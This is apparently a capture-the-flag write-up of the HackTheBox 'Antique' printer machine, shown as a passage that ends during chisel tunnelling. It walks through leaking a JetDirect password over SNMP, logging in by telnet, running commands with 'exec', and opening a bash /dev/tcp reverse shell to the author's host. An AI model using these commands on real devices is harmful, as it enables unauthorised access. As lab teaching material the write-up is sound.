@@ -1,0 +1,522 @@
+<article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header class="post-header">
+<h1 class="post-title p-name" itemprop="name headline">HTB: Antique</h1>
+<p class="post-meta">
+<span class="tag-list"><a class="post-tag" href="/tags#htb-antique">htb-antique</a> <a class="post-tag" href="/tags#hackthebox">hackthebox</a> <a class="post-tag" href="/tags#ctf">ctf</a> <a class="post-tag" href="/tags#printer">printer</a> <a class="post-tag" href="/tags#nmap">nmap</a> <a class="post-tag" href="/tags#jetdirect">jetdirect</a> <a class="post-tag" href="/tags#telnet">telnet</a> <a class="post-tag" href="/tags#python">python</a> <a class="post-tag" href="/tags#snmp">snmp</a> <a class="post-tag" href="/tags#snmpwalk">snmpwalk</a> <a class="post-tag" href="/tags#tunnel">tunnel</a> <a class="post-tag" href="/tags#chisel">chisel</a> <a class="post-tag" href="/tags#cups">cups</a> <a class="post-tag" href="/tags#cve-2012-5519">cve-2012-5519</a> <a class="post-tag" href="/tags#hashcat">hashcat</a> <a class="post-tag" href="/tags#shadow">shadow</a> <a class="post-tag" href="/tags#cve-2015-1158">cve-2015-1158</a> <a class="post-tag" href="/tags#pwnkit">pwnkit</a> <a class="post-tag" href="/tags#shared-object">shared-object</a> <a class="post-tag" href="/tags#cve-2021-4034">cve-2021-4034</a> </span><br/><br/>
+<time class="dt-published" datetime="2022-05-03T09:00:00+00:00" itemprop="datePublished">May 3, 2022
+      </time></p>
+</header>
+<div class="post-content e-content" itemprop="articleBody">
+<div class="row">
+<div class="col-sm-3">
+<div class="sticky-top">
+<p><a href="/2022/05/03/htb-antique.html" style="color: #e6e6e6; text-decoration: none;">HTB: Antique</a></p>
+<!--https://afeld.github.io/bootstrap-toc/-->
+<nav data-toggle="toc" id="toc"></nav>
+</div>
+</div>
+<div class="col-sm-9" id="postBody">
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/antique-cover.webp" type="image/webp"/>
+<img alt="Antique" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/antique-cover.png" style="float: right; margin-right:50px; margin-left:50px; height:120px;">
+</img></picture>
+<p>Antique released non-competitively as part of HackTheBox’s Printer track. It’s a box simulating an old HP printer. I’ll start by leaking a password over SNMP, and then use that over telnet to connect to the printer, where there’s an exec command to run commands on the system. To escalate, I’ll abuse an old instance of CUPS print manager software to get file read as root, and get the root flag. In Beyond Root, I’ll look at two more CVEs, another CUPS one that didn’t work because no actual printers were attached, and PwnKit, which does work.</p>
+<h2 id="box-info">Box Info</h2>
+<!-- https://app.hackthebox.com/machines/400 -->
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th style="text-align: right"><a href="https://hackthebox.com/machines/antique" style="font-size: xx-large; text-shadow: 0 0 5px #ffffff, 0 0 7px #ffffff; color: #1756a9" target="_blank">Antique</a> <a href="https://hackthebox.com/machines/antique" target="_blank"><picture style="float: right; padding-left: 20px;"><source srcset="/icons/box-antique.webp" type="image/webp"/> <img alt="Antique" class="img-av" src="/icons/box-antique.png"/></picture></a><br/><a href="https://hackthebox.com/machines/antique" style="font-size: small; color: white;" target="_blank">Play on HackTheBox</a></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Release Date</td>
+<td style="text-align: right">27 Sep 2021</td>
+</tr>
+<tr>
+<td>Retire Date</td>
+<td style="text-align: right">27 Sep 2021</td>
+</tr>
+<tr>
+<td>OS</td>
+<td style="text-align: right">Linux <picture><source srcset="/icons/Linux.webp" type="image/webp"/><img alt="Linux" class="img-os" src="/icons/Linux.png"/></picture></td>
+</tr>
+<tr>
+<td>Base Points</td>
+<td style="text-align: right"><span class="diff-Easy">Easy [20]</span></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-user.webp" type="image/webp"/><img alt="First Blood User" src="/icons/first-blood-user.png" style="display: unset"/></picture></td>
+<td style="text-align: right">N/A (non-competitive)</td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-root.webp" type="image/webp"/><img alt="First Blood Root" src="/icons/first-blood-root.png" style="display: unset"/></picture></td>
+<td style="text-align: right">N/A (non-competitive)</td>
+</tr>
+<tr>
+<td>Creator</td>
+<td style="text-align: right"><a href="https://app.hackthebox.com/users/13531" rel="noopener" target="_blank"><img alt="MrR3boot" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/13531" style="display: unset"/><span class="user-text" style="display: none"> MrR3boot</span></a><br/></td>
+</tr>
+</tbody>
+</table>
+<h2 id="recon">Recon</h2>
+<h3 id="tcp-nmap">TCP nmap</h3>
+<p><code class="language-plaintext highlighter-rouge">nmap</code> finds only one open TCP ports, telnet (23):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 10000 <span class="nt">-oA</span> scans/nmap-alltcp 10.10.11.107
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2022-05-02 00:47 UTC
+Nmap scan report for 10.10.11.107
+Host is up (0.097s latency).
+Not shown: 65534 closed ports
+PORT   STATE SERVICE
+23/tcp open  telnet
+
+Nmap done: 1 IP address (1 host up) scanned in 8.00 seconds
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p</span> 23 <span class="nt">-sCV</span> <span class="nt">-oA</span> scans/nmap-tcpscripts 10.10.11.107
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2022-05-02 00:50 UTC
+Nmap scan report for 10.10.11.107
+Host is up (0.090s latency).
+
+PORT   STATE SERVICE VERSION
+23/tcp open  telnet?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns, tn3270: 
+|     JetDirect
+|     Password:
+|   NULL: 
+|_    JetDirect
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port23-TCP:V=7.80%I=7%D=5/2%Time=626F2AC3%P=x86_64-pc-linux-gnu%r(NULL,
+SF:F,"\nHP\x20JetDirect\n\n")%r(GenericLines,19,"\nHP\x20JetDirect\n\nPass
+...[snip]...
+SF:rect\n\nPassword:\x20");
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 166.19 seconds
+</span></code></pre></div></div>
+<p>The string “JetDirect” jumps out as interesting in the telnet scan.</p>
+<h3 id="telnet---tcp-23">Telnet - TCP 23</h3>
+<p>I’ll use <code class="language-plaintext highlighter-rouge">telnet</code> to connect to Antique and it returns a banner for HP JetDirect and a password prompt:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>telnet 10.10.11.107
+<span class="go">Trying 10.10.11.107...
+Connected to 10.10.11.107.
+Escape character is '^]'.
+
+HP JetDirect
+
+</span><span class="gp">Password:</span><span class="w">
+</span></code></pre></div></div>
+<p>Guessing the password admin closes the connection:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">Password:</span><span class="w"> </span>admin
+<span class="go">Invalid password
+Connection closed by foreign host.
+</span></code></pre></div></div>
+<h3 id="udp-nmap">UDP nmap</h3>
+<p>Given the last of any other paths on TCP, I’ll check back to a UDP scan. Scanning for UDP can be both slow and unreliable. I do find <code class="language-plaintext highlighter-rouge">-sV</code> to make the results more reliable (and probably slower), but even just looking a the top ten ports finds something interesting on Antique:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">sudo </span>nmap <span class="nt">-sU</span> <span class="nt">--top-ports</span> 10 <span class="nt">-sV</span> 10.10.11.107
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2022-05-02 10:22 UTC
+Nmap scan report for 10.10.11.107
+Host is up (0.090s latency).
+
+PORT     STATE  SERVICE      VERSION
+53/udp   closed domain
+67/udp   closed dhcps
+123/udp  closed ntp
+135/udp  closed msrpc
+137/udp  closed netbios-ns
+138/udp  closed netbios-dgm
+161/udp  open   snmp         SNMPv1 server (public)
+445/udp  closed microsoft-ds
+631/udp  closed ipp
+1434/udp closed ms-sql-m
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 12.35 seconds
+</span></code></pre></div></div>
+<p>SNMP (UDP 161) is responding.</p>
+<h3 id="snmp---udp-161">SNMP - UDP 161</h3>
+<p>Running <code class="language-plaintext highlighter-rouge">snmpwalk</code> on Antique will only return one entry:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>snmpwalk <span class="nt">-v</span> 2c <span class="nt">-c</span> public 10.10.11.107
+<span class="go">iso.3.6.1.2.1 = STRING: "HTB Printer"
+</span></code></pre></div></div>
+<p>However, this post on <a href="http://www.irongeek.com/i.php?page=security/networkprinterhacking">Hacking Network Printers</a> suggests I can leak the password if I ask for a specific variable:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>snmpwalk <span class="nt">-v</span> 2c <span class="nt">-c</span> public 10.10.11.107 .1.3.6.1.4.1.11.2.3.9.1.1.13.0
+<span class="go">iso.3.6.1.4.1.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 
+33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135 
+</span></code></pre></div></div>
+<p>The blog post says that these are hex representations of each byte. I’ll recognize that the numbers at the start of the list are in the hex ASCII range (0x20 - 0x7e), even if that ones at the end don’t make sense in that context.</p>
+<p>I’ll drop into a Python shell and save the numbers as <code class="language-plaintext highlighter-rouge">nums</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="n">python</span>
+<span class="go">Python 3.8.10 (default, Mar 15 2022, 12:22:08) 
+[GCC 9.4.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+</span><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">nums</span> <span class="o">=</span> <span class="sh">"</span><span class="s">50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135</span><span class="sh">"</span>
+</code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">.split()</code> will break the string into an array of strings, splitting at the spaces:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">nums</span><span class="p">.</span><span class="nf">split</span><span class="p">()</span>
+<span class="go">['50', '40', '73', '73', '77', '30', '72', '64', '40', '31', '32', '33', '21', '21', '31', '32', '33', '1', '3', '9', '17', '18', '19', '22', '23', '25', '26', '27', '30', '31', '33', '34', '35', '37', '38', '39', '42', '43', '49', '50', '51', '54', '57', '58', '61', '65', '74', '75', '79', '82', '83', '86', '90', '91', '94', '95', '98', '103', '106', '111', '114', '115', '119', '122', '123', '126', '130', '131', '134', '135']
+</span></code></pre></div></div>
+<p>I’ll use a Python list comprehension to loop over each item and apply the <code class="language-plaintext highlighter-rouge">int</code> function, converting each to a number, using base 16 to convert from hex:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="p">[</span><span class="nf">int</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">nums</span><span class="p">.</span><span class="nf">split</span><span class="p">()]</span>
+<span class="go">[80, 64, 115, 115, 119, 48, 114, 100, 64, 49, 50, 51, 33, 33, 49, 50, 51, 1, 3, 9, 23, 24, 25, 34, 35, 37, 38, 39, 48, 49, 51, 52, 53, 55, 56, 57, 66, 67, 73, 80, 81, 84, 87, 88, 97, 101, 116, 117, 121, 130, 131, 134, 144, 145, 148, 149, 152, 259, 262, 273, 276, 277, 281, 290, 291, 294, 304, 305, 308, 309]
+</span></code></pre></div></div>
+<p>Now I’ll want each converted to an ASCII character using <code class="language-plaintext highlighter-rouge">chr</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="p">[</span><span class="nf">chr</span><span class="p">(</span><span class="nf">int</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="mi">16</span><span class="p">))</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">nums</span><span class="p">.</span><span class="nf">split</span><span class="p">()]</span>
+<span class="go">['P', '@', 's', 's', 'w', '0', 'r', 'd', '@', '1', '2', '3', '!', '!', '1', '2', '3', '\x01', '\x03', '\t', '\x17', '\x18', '\x19', '"', '#', '%', '&amp;', "'", '0', '1', '3', '4', '5', '7', '8', '9', 'B', 'C', 'I', 'P', 'Q', 'T', 'W', 'X', 'a', 'e', 't', 'u', 'y', '\x82', '\x83', '\x86', '\x90', '\x91', '\x94', '\x95', '\x98', 'ă', 'Ć', 'đ', 'Ĕ', 'ĕ', 'ę', 'Ģ', 'ģ', 'Ħ', 'İ', 'ı', 'Ĵ', 'ĵ']
+</span><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="sh">''</span><span class="p">.</span><span class="nf">join</span><span class="p">([</span><span class="nf">chr</span><span class="p">(</span><span class="nf">int</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="mi">16</span><span class="p">))</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">nums</span><span class="p">.</span><span class="nf">split</span><span class="p">()])</span>
+<span class="go">'P@ssw0rd@123!!123\x01\x03\t\x17\x18\x19"#%&amp;\'01345789BCIPQTWXaetuy\x82\x83\x86\x90\x91\x94\x95\x98ăĆđĔĕęĢģĦİıĴĵ'
+</span></code></pre></div></div>
+<p>I’ll use <code class="language-plaintext highlighter-rouge">''.join()</code> to combine the list of characters back into a single more readable string. Perhaps the password is “P@ssw0rd@123!!123”.</p>
+<h2 id="shell-as-lp">Shell as lp</h2>
+<h3 id="authenticated-telnet">Authenticated Telnet</h3>
+<p>I’ll try telnet again, this time with the potential password:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>telnet 10.10.11.107
+<span class="go">Trying 10.10.11.107...
+Connected to 10.10.11.107.
+Escape character is '^]'.
+
+HP JetDirect
+
+Password: P@ssw0rd@123!!123
+
+Please type "?" for HELP
+</span><span class="gp">&gt;</span><span class="w"> 
+</span></code></pre></div></div>
+<p>It worked!</p>
+<h3 id="execution">Execution</h3>
+<p>The login message says that <code class="language-plaintext highlighter-rouge">?</code> will show the help. I’ll try that:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">&gt;</span><span class="w"> </span>?
+<span class="go">
+To Change/Configure Parameters Enter:
+Parameter-name: value &lt;Carriage Return&gt;
+
+Parameter-name Type of value
+ip: IP-address in dotted notation
+subnet-mask: address in dotted notation (enter 0 for default)
+default-gw: address in dotted notation (enter 0 for default)
+syslog-svr: address in dotted notation (enter 0 for default)
+idle-timeout: seconds in integers
+set-cmnty-name: alpha-numeric string (32 chars max)
+host-name: alpha-numeric string (upper case only, 32 chars max)
+dhcp-config: 0 to disable, 1 to enable
+allow: &lt;ip&gt; [mask] (0 to clear, list to display, 10 max)
+
+addrawport: &lt;TCP port num&gt; (&lt;TCP port num&gt; 3000-9000)
+deleterawport: &lt;TCP port num&gt;
+listrawport: (No parameter required)
+
+exec: execute system commands (exec id)
+exit: quit from telnet session
+</span></code></pre></div></div>
+<p>Most of it is about configuring the printer, but the last one, <code class="language-plaintext highlighter-rouge">exec</code> is very interesting for my purposes. I’ll try running <code class="language-plaintext highlighter-rouge">id</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">&gt;</span><span class="w"> </span><span class="nb">exec id</span>
+<span class="go">uid=7(lp) gid=7(lp) groups=7(lp),19(lpadmin)
+</span></code></pre></div></div>
+<p>That’s execution!</p>
+<h3 id="reverse-shell">Reverse Shell</h3>
+<p>My go-to reverse shell is bash (see <a href="https://www.youtube.com/watch?v=OjkVep2EIlw">this video</a> on how it works). Given this is a printer, I’ll check if <code class="language-plaintext highlighter-rouge">bash</code> is on the box, and it is:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">&gt;</span><span class="w"> </span><span class="nb">exec </span>which bash
+<span class="go">/usr/bin/bash
+</span></code></pre></div></div>
+<p>I’ll start <code class="language-plaintext highlighter-rouge">nc</code> listening on my host using <code class="language-plaintext highlighter-rouge">nc -lnvp 443</code>, and the run the reverse shell on Antique, <code class="language-plaintext highlighter-rouge">exec bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.6/443 0&gt;&amp;1'</code>. It just hangs, but at <code class="language-plaintext highlighter-rouge">nc</code> there’s a shell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 443
+<span class="go">Listening on 0.0.0.0 443
+Connection received on 10.10.11.107 53188
+bash: cannot set terminal process group (1014): Inappropriate ioctl for device
+bash: no job control in this shell
+</span><span class="gp">lp@antique:~$</span><span class="w"> </span><span class="nb">id</span> 
+<span class="go">uid=7(lp) gid=7(lp) groups=7(lp),19(lpadmin)
+</span></code></pre></div></div>
+<p>The <code class="language-plaintext highlighter-rouge">script</code> shell upgrade trick didn’t work for me (just messed up my terminal), but the Python one worked fine:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">lp@antique:~$</span><span class="w"> </span>python3 <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("bash")'</span>
+<span class="gp">lp@antique:~$</span><span class="w"> </span>^Z
+<span class="go">[1]+  Stopped                 nc -lnvp 444
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span>
+<span class="go">nc -lnvp 444
+            reset
+reset: unknown terminal type unknown
+Terminal type? screen
+</span><span class="gp">lp@antique:~$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">telnet.py  user.txt
+</span><span class="gp">lp@antique:~$</span><span class="w"> 
+</span></code></pre></div></div>
+<p>I can access <code class="language-plaintext highlighter-rouge">user.txt</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">lp@antique:~$</span><span class="w"> </span><span class="nb">cat </span>user.txt
+<span class="go">aad6f75c************************
+</span></code></pre></div></div>
+<h2 id="shell-as-root">Shell as root</h2>
+<h3 id="enumeration">Enumeration</h3>
+<h4 id="home-directory">Home Directory</h4>
+<p>lp’s home directory is in a non-standard location:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">lp@antique:~$</span><span class="w"> </span><span class="nb">pwd</span>
+<span class="go">/var/spool/lpd
+</span></code></pre></div></div>
+<p>Regardless, it’s pretty empty:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">lp@antique:~$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span>
+<span class="go">ls -la
+total 16
+drwxr-xr-x 2 lp   lp   4096 Sep 27  2021 .
+drwxr-xr-x 6 root root 4096 May 14  2021 ..
+lrwxrwxrwx 1 lp   lp      9 May 14  2021 .bash_history -&gt; /dev/null
+-rwxr-xr-x 1 lp   lp   1959 Sep 27  2021 telnet.py
+-rw------- 2 lp   lp     33 May  2 00:42 user.txt
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">telnet.py</code> is the program that’s faking an HP telnet service. The process list (<code class="language-plaintext highlighter-rouge">ps auxww</code>) shows that script being run as lp, so not much value in looking to exploit it further:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lp          1024  0.0  0.2 239656 10920 ?        Sl   00:42   0:00 python3 /var/spool/lpd/telnet.py
+</code></pre></div></div>
+<h4 id="listening-services">Listening Services</h4>
+<p>There’s one other port listening on Antique besides telnet:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">lp@antique:~$</span><span class="w"> </span>netstat <span class="nt">-tnlp</span>
+<span class="go">(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN      1024/python3        
+tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 ::1:631                 :::*                    LISTEN      -   
+</span></code></pre></div></div>
+<p>If I <code class="language-plaintext highlighter-rouge">nc</code> to that port and just put in some junk and hit enter, it returns a HTTP 400 Bad Request:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">lp@antique:~$</span><span class="w"> </span>nc 127.0.0.1 631
+<span class="go">lasd
+HTTP/1.0 400 Bad Request
+Date: Mon, 02 May 2022 13:05:39 GMT
+Server: CUPS/1.6
+Content-Type: text/html; charset=utf-8
+Content-Length: 346
+
+&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"&gt;
+&lt;HTML&gt;
+&lt;HEAD&gt;
+        &lt;META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=utf-8"&gt;
+        &lt;TITLE&gt;Bad Request - CUPS v1.6.1&lt;/TITLE&gt;
+        &lt;LINK REL="STYLESHEET" TYPE="text/css" HREF="/cups.css"&gt;
+&lt;/HEAD&gt;
+&lt;BODY&gt;
+&lt;H1&gt;Bad Request&lt;/H1&gt;
+&lt;P&gt;&lt;/P&gt;
+&lt;/BODY&gt;
+&lt;/HTML&gt;
+</span></code></pre></div></div>
+<p>If I <code class="language-plaintext highlighter-rouge">curl</code> that port, it returns a page:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">lp@antique:~$</span><span class="w"> </span>curl 127.0.0.1:631                      
+<span class="go">&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"&gt;
+&lt;HTML&gt;                                                 
+&lt;HEAD&gt;
+        &lt;META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=utf-8"&gt;
+        &lt;TITLE&gt;Home - CUPS 1.6.1&lt;/TITLE&gt;
+        &lt;LINK REL="STYLESHEET" TYPE="text/css" HREF="/cups.css"&gt;
+        &lt;LINK REL="SHORTCUT ICON" HREF="/images/cups-icon.png" TYPE="image/png"&gt;
+&lt;/HEAD&gt;                                                           
+&lt;BODY&gt;
+&lt;TABLE CLASS="page" SUMMARY="{title}"&gt; 
+...[snip]...
+</span></code></pre></div></div>
+<h3 id="cups--ipp">CUPs / IPP</h3>
+<h4 id="tunnel">Tunnel</h4>
+<p>To get a better look at the page, I’ll set up a tunnel so I can access it from my host, using <a href="https://github.com/jpillora/chisel">Chisel</a> (see <a href="/cheatsheets/chisel">this post</a> for Chisel details). I’ll download the <a href="https://github.com/jpillora/chisel/releases/tag/v1.7.7">latest release</a> from GitHub, decompress it, and start a Python webserver in that directory:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
+<span class="go">--2022-05-02 13:21:41--  https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
+Resolving github.com (github.com)... 140.82.113.4
+Connecting to github.com (github.com)|140.82.113.4|:443... connected.
+HTTP request sent, awaiting response... 302 Found
+Location: https://objects.githubusercontent.com/github-production-release-asset-2e65be/31311037/ba3e7fe5-01fc-4b0c-b8eb-1b3a4c8eb61f?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20220502%2Fus-east-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20220502T132141Z&amp;X-Amz-Expires=300&amp;X-Amz-Signature=71b61999ecaa294c3b7dec1489e6b6ffb2d943a271184c0de349c018c0f92cad&amp;X-Amz-SignedHeaders=host&amp;actor_id=0&amp;key_id=0&amp;repo_id=31311037&amp;response-content-disposition=attachment%3B%20filename%3Dchisel_1.7.7_linux_amd64.gz&amp;response-content-type=application%2Foctet-stream [following]
+--2022-05-02 13:21:41--  https://objects.githubusercontent.com/github-production-release-asset-2e65be/31311037/ba3e7fe5-01fc-4b0c-b8eb-1b3a4c8eb61f?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20220502%2Fus-east-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20220502T132141Z&amp;X-Amz-Expires=300&amp;X-Amz-Signature=71b61999ecaa294c3b7dec1489e6b6ffb2d943a271184c0de349c018c0f92cad&amp;X-Amz-SignedHeaders=host&amp;actor_id=0&amp;key_id=0&amp;repo_id=31311037&amp;response-content-disposition=attachment%3B%20filename%3Dchisel_1.7.7_linux_amd64.gz&amp;response-content-type=application%2Foctet-stream
+Resolving objects.githubusercontent.com (objects.githubusercontent.com)... 185.199.109.133, 185.199.110.133, 185.199.108.133, ...
+Connecting to objects.githubusercontent.com (objects.githubusercontent.com)|185.199.109.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3234355 (3.1M) [application/octet-stream]
+Saving to: ‘chisel_1.7.7_linux_amd64.gz’
+
+chisel_1.7.7_linux_amd64.gz                                                     100%[====================================================================================================================================================================================================&gt;]   3.08M  9.65MB/s    in 0.3s    
+
+2022-05-02 13:21:41 (9.65 MB/s) - ‘chisel_1.7.7_linux_amd64.gz’ saved [3234355/3234355]
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">gunzip </span>chisel_1.7.7_linux_amd64.gz 
+<span class="gp">oxdf@hacky$</span><span class="w"> </span>python3 <span class="nt">-m</span> http.server 80
+<span class="go">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+</span></code></pre></div></div>
+<p>From Antique, I’ll fetch the binary:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">lp@antique:/dev/shm$</span><span class="w"> </span>wget 10.10.14.6/chisel_1.7.7_linux_amd64              
+<span class="go">wget 10.10.14.6/chisel_1.7.7_linux_amd64                                   
+--2022-05-02 13:23:19--  http://10.10.14.6/chisel_1.7.7_linux_amd64        
+Connecting to 10.10.14.6:80... connected.                                  
+HTTP request sent, awaiting response... 200 OK                             
+Length: 8077312 (7.7M) [application/octet-stream]                            
+Saving to: ‘chisel_1.7.7_linux_amd64’                                      
+
+     0K .......... .......... .......... .......... ..........  0%  268K 29s
+...[snip]...
+  7800K .......... .......... .......... .......... .......... 99% 2.52M 0s
+  7850K .......... .......... .......... ........             100% 1.37M=2.8s
+
+2022-05-02 13:23:22 (2.78 MB/s) - ‘chisel_1.7.7_linux_amd64’ saved [8077312/8077312]
+</span></code></pre></div></div>
+<p>On my host, I’ll run the same binary as the server:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>./chisel_1.7.7_linux_amd64 server <span class="nt">-p</span> 9000 <span class="nt">--reverse</span>
+<span class="go">2022/05/02 13:29:45 server: Reverse tunnelling enabled
+2022/05/02 13:29:45 server: Fingerprint nAhajozV41EjYejrhftqY6829U+uzLWqa/ESPyvCIFM=
+2022/05/02 13:29:45 server: Listening on http://0.0.0.0:9000
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">-p 9000</code> sets that as the port to listen on (any port will do, but the default is 8080, which Burp is already using on my host), and <code class="language-plaintext highlighter-rouge">--reverse</code> allows for reverse tunnels, so that a client can open a listening port on my VM.</p>
+<p>Now I’ll connect to it from Antique:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">lp@antique:/dev/shm$</span><span class="w"> </span><span class="nb">chmod</span> +x chisel_1.7.7_linux_amd64
+<span class="gp">lp@antique:/dev/shm$</span><span class="w"> </span>./chisel_1.7.7_linux_amd64 client 10.10.14.6:9000 R:9631:localhost:631                                              
+<span class="go">&lt;x_amd64 client 10.10.14.6:9000 R:9631:localhost:631
+2022/05/02 13:30:16 client: Connecting to ws://10.10.14.6:9000
+2022/05/02 13:30:17 client: Connected (Latency 90.506923ms)
